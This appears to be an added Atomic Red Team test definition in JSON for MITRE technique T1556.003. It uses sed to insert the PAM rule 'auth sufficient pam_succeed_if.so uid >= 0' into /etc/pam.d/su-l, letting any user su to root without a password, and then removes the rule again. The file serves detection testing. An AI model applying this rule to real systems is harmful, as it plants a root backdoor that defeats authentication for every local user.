@@ -1,0 +1,64 @@
+{
+  "id": "4b9dde80-ae22-44b1-a82a-644bf009eb9c",
+  "name": "Malicious PAM rule",
+  "description": "Inserts a rule into a PAM config and then tests it.\n\nUpon successful execution, this test will insert a rule that allows every user to su to root without a password.\n",
+  "platforms": [
+    "linux"
+  ],
+  "steps": [
+    {
+      "id": "a45e2d1f-d79b-41f2-99b2-449f69dfe916",
+      "type": "execute-command",
+      "data": {
+        "command": "sudo sed -i \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "50bba443-b380-4de9-bd5c-c28fb2439f9e",
+      "type": "execute-command",
+      "data": {
+        "command": "sudo sed -i \"\\,#{pam_rule},d\" #{path_to_pam_conf}\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "a45e2d1f-d79b-41f2-99b2-449f69dfe916",
+      "p": "on-success",
+      "o": "50bba443-b380-4de9-bd5c-c28fb2439f9e"
+    },
+    {
+      "s": "a45e2d1f-d79b-41f2-99b2-449f69dfe916",
+      "p": "on-failure",
+      "o": "50bba443-b380-4de9-bd5c-c28fb2439f9e"
+    }
+  ],
+  "tags": [
+    "T1556.003",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "index",
+      "type": "integer",
+      "description": "Index where the rule is inserted.",
+      "value": "1"
+    },
+    {
+      "name": "path_to_pam_conf",
+      "type": "string",
+      "description": "PAM config file to modify.",
+      "value": "/etc/pam.d/su-l"
+    },
+    {
+      "name": "pam_rule",
+      "type": "string",
+      "description": "Rule to add to the PAM config.",
+      "value": "auth sufficient pam_succeed_if.so uid \u003e= 0"
+    }
+  ]
+}
